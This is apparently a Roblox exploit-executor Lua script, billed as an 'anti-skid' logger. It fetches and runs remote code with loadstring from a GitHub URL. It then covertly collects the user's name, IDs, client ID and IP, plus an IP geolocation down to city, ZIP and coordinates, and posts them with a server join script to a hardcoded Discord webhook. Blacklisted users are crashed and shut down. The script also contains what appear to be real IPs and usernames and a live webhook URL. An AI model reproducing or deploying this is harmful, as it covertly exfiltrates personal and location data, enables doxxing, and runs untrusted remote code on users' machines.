-- Logger With Blacklist and Lockdown Whitelist
-- Hydrazias Anti-Skid v5+ ULTIMATE (Final)

-- Prevent duplicate execution
if getgenv and getgenv().HydraziaLoggerExecuted then return end
getgenv().HydraziaLoggerExecuted = true

local dad = loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrazia/COEMS/refs/heads/main/Daddy%20dad.lua"))()
local req = http_request or request or (syn and syn.request)
local httpService = game:GetService("HttpService")
local marketplaceService = game:GetService("MarketplaceService")
local players = game:GetService("Players")
local rbxAnalyticsService = game:GetService("RbxAnalyticsService")

-- Game/Player Info
local gameName = marketplaceService:GetProductInfo(game.PlaceId).Name
local gameLink = "https://www.roblox.com/games/"..game.PlaceId
local player = players.LocalPlayer
local playerName = player.Name
local playerDisplayName = player.DisplayName
local playerUserId = player.UserId
local clientId = tostring(rbxAnalyticsService:GetClientId())

-- Blacklists
local blacklist = {
    IPs = {"IP", "IP", "81.184.165.2", "187.244.97.88", "IP"},
    Usernames = {"AlexusCorteza", "pokemonhaden", "USER", "USER", "elpapucho1638", "Webii63", "USER"},
    UserIDs = {4332089201, 107837090, 1630944012, 5855058813, 5592931642, 8111928768, 1582323149},
    HWIDs = {"hwid", "ClientId", "f4be6537-85fb-450e-9f6e-9b57b1e06e73", "3813aebd-df45-44a1-9a77-27c57d729b6a", "2d1ea50c-10d0-4cfe-84fb-8d629f227a2a"}
}

-- Whitelist
local LockDown = false
local whitelist = {
    IPs = {"IP", "IP"},
    Usernames = {"onbocombo", "YourUserHere"},
    UserIDs = {123456789, 987654321},
    HWIDs = {"hwid-allowed-1", "soon"}
}

local webhook = "https://discord.com/api/webhooks/1405280955756974090/AUwY9hIRfG6rHQZrbts8fYy1c1BfDvce0p2Ki_IvAGL3aHtHmU7WmpcfePP7OAwYFv4I"
if not webhook then return end

-- IP Fetch
local ipData = req({Url = "http://ip-api.com/json/", Method = "GET"})
local ipJson = {query = "Unknown"}
if ipData and ipData.Body then
    pcall(function() ipJson = httpService:JSONDecode(ipData.Body) end)
end
local ip = ipJson.query or "Unknown"

-- Player Data
local profileLink = "https://www.roblox.com/users/"..playerUserId.."/profile"
local joinCommand = 'Roblox.GameLauncher.joinGameInstance("'..game.PlaceId..'", "'..game.JobId..'")'
local executorName = identifyexecutor and identifyexecutor() or "Unknown"
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

-- Join Script
local joinScript = [[
    local joinPlaceId = "]]..game.PlaceId..[["
    local joinJobId = "]]..game.JobId..[["
    game:GetService("TeleportService"):TeleportToPlaceInstance(joinPlaceId, joinJobId)
]]

-- Thumbnail
local thumbnail = "https://tr.rbxcdn.com/5e5a3f9d16a3e7bc1c1a1d1b6e3f2e2a/150/150/AvatarHeadshot/Png"
pcall(function()
    local thumbData = httpService:JSONDecode(game:HttpGet(
        "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..
        playerUserId.."&size=150x150&format=Png&isCircular=false"
    ))
    if thumbData and thumbData.data and thumbData.data[1] then
        thumbnail = thumbData.data[1].imageUrl
    end
end)

-- ====== ENHANCED CHECK SYSTEM ======
local isWhitelisted = false
local whitelistReasons = {}

if table.find(whitelist.IPs, ip) then
    isWhitelisted = true
    table.insert(whitelistReasons, "IP")
end
if table.find(whitelist.UserIDs, playerUserId) then
    isWhitelisted = true
    table.insert(whitelistReasons, "UserID")
end
if table.find(whitelist.Usernames, playerName) then
    isWhitelisted = true
    table.insert(whitelistReasons, "Username")
end
if table.find(whitelist.HWIDs, clientId) then
    isWhitelisted = true
    table.insert(whitelistReasons, "HWID")
end

local isBlacklisted = false
local blacklistReasons = {}

if not isWhitelisted then
    if table.find(blacklist.IPs, ip) then
        isBlacklisted = true
        table.insert(blacklistReasons, "IP")
    end
    if table.find(blacklist.UserIDs, playerUserId) then
        isBlacklisted = true
        table.insert(blacklistReasons, "UserID")
    end
    if table.find(blacklist.Usernames, playerName) then
        isBlacklisted = true
        table.insert(blacklistReasons, "Username")
    end
    if table.find(blacklist.HWIDs, clientId) then
        isBlacklisted = true
        table.insert(blacklistReasons, "HWID")
    end
end

local lockdownKick = LockDown and not isWhitelisted

-- ====== COMPLETE MESSAGE SYSTEM ======
local whitelistStatus = "âšª WHITELIST: "..tostring(isWhitelisted)
local blacklistStatus = "ðŸ”´ BLACKLIST: "..tostring(isBlacklisted)
local lockdownStatus = "âš« LOCKDOWN: "..tostring(LockDown)
local verificationStatus = not isWhitelisted and not isBlacklisted and "ðŸŸ¡ UNVERIFIED" or ""

-- Detailed non-whitelisted information
local nonWhitelistedDetails = {}
if not isWhitelisted then
    if not table.find(whitelist.IPs, ip) then
        table.insert(nonWhitelistedDetails, "IP not whitelisted")
    end
    if not table.find(whitelist.UserIDs, playerUserId) then
        table.insert(nonWhitelistedDetails, "UserID not whitelisted")
    end
    if not table.find(whitelist.Usernames, playerName) then
        table.insert(nonWhitelistedDetails, "Username not whitelisted")
    end
    if not table.find(whitelist.HWIDs, clientId) then
        table.insert(nonWhitelistedDetails, "HWID not whitelisted")
    end
end

local nonWhitelistedMsg = #nonWhitelistedDetails > 0 and ("\n\nNot Whitelisted In: "..table.concat(nonWhitelistedDetails, ", ")) or ""

local whitelistMsg = isWhitelisted and ("\n\nðŸŸ¢ WHITELISTED (VIA: "..table.concat(whitelistReasons, ", ")..")") or nonWhitelistedMsg
local blacklistMsg = isBlacklisted and ("\n\nðŸ”´ BLACKLISTED (REASON: "..table.concat(blacklistReasons, ", ")..")") or ""
local lockdownMsg = lockdownKick and "\n\nâšª NOT WHITELISTED (LOCKDOWN ACTIVE)" or ""
local originalMsg = isBlacklisted and "\n\nBLACKLISTED_PLAYER_FUCKED" or 
                   lockdownKick and "\n\nLOCAL_PLAYER_FUCKED" or ""

-- Status messages
local statusMsg = "\n\n"..whitelistStatus.."\n"..blacklistStatus.."\n"..lockdownStatus
if verificationStatus ~= "" then
    statusMsg = statusMsg.."\n"..verificationStatus
end

-- ====== EMBED BUILDING ======
local embedTitle = isBlacklisted and "Blacklisted_Player_Info_Logged" or
                  lockdownKick and "Lockdown_Player_Info_Logged" or
                  (not isWhitelisted and not isBlacklisted) and "Unverified_Player_Logged" or
                  "Player_Logged"

local embedColor = isBlacklisted and 16711680 or      -- Red
                   isWhitelisted and 65280 or         -- Green
                   lockdownKick and 16711680 or       -- Red
                   not isWhitelisted and 16753920 or  -- Yellow (unverified)
                   0                                 -- Default

local infoEmbed = {
    title = embedTitle,
    description = table.concat({
        "Game Name: "..gameName,
        "Username: "..playerName,
        "Display Name: "..playerDisplayName,
        "UserId: "..playerUserId,
        "ClientId: "..clientId,
        "IP: "..ip,
        "GameId: "..game.GameId,
        "PlaceId: "..game.PlaceId,
        "JobId: "..game.JobId,
        "Game Link: "..gameLink,
        "Profile Link: "..profileLink,
        "Join: "..joinCommand,
        "Joinscript (Hold to Copy): ```lua\n"..joinScript.."\n```",
        "Executor: "..executorName,
        "Time: "..currentTime,
        "Thumbnail: "..thumbnail,
        statusMsg,
        whitelistMsg,
        blacklistMsg,
        lockdownMsg,
        originalMsg
    }, "\n"),
    color = embedColor,
    author = {name = embedTitle},
    thumbnail = {url = thumbnail}
}

local ipEmbed = {
    title = "IP_Information",
    description = table.concat({
        "IP Address: "..(ipJson.query or "Unknown"),
        "Country: "..(ipJson.country or "Unknown"),
        "Country Code: "..(ipJson.countryCode or "Unknown"),
        "Region: "..(ipJson.region or "Unknown"),
        "Region Name: "..(ipJson.regionName or "Unknown"),
        "City: "..(ipJson.city or "Unknown"),
        "ZIP Code: "..(ipJson.zip or "Unknown"),
        "Latitude: "..tostring(ipJson.lat or "Unknown"),
        "Longitude: "..tostring(ipJson.lon or "Unknown"),
        "Timezone: "..(ipJson.timezone or "Unknown"),
        "ISP: "..(ipJson.isp or "Unknown"),
        "Organization: "..(ipJson.org or "Unknown"),
        "AS: "..(ipJson["as"] or "Unknown"),
        "Mobile: "..tostring(ipJson.mobile or "Unknown"),
        "Proxy: "..tostring(ipJson.proxy or "Unknown"),
        "Hosting: "..tostring(ipJson.hosting or "Unknown")
    }, "\n"),
    color = 3447003
}

-- ====== WEBHOOK SEND ======
pcall(function()
    req({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = httpService:JSONEncode({embeds = {infoEmbed, ipEmbed}})
    })
end)

-- ====== ABUSE SYSTEM ======
if isBlacklisted then
    task.wait(0.5)
    dad.Kick()
    task.wait(5)
    dad.Destroy()
    task.wait(10)
    dad.Crash()
    task.wait(15)
    dad.ShutDown()
elseif LockDown and lockdownKick then
    task.wait(0.5)
    dad.Kick()
    task.wait(5)
    dad.Destroy()
    task.wait(10)
    dad.Crash()
    task.wait(15)
    dad.ShutDown()
end
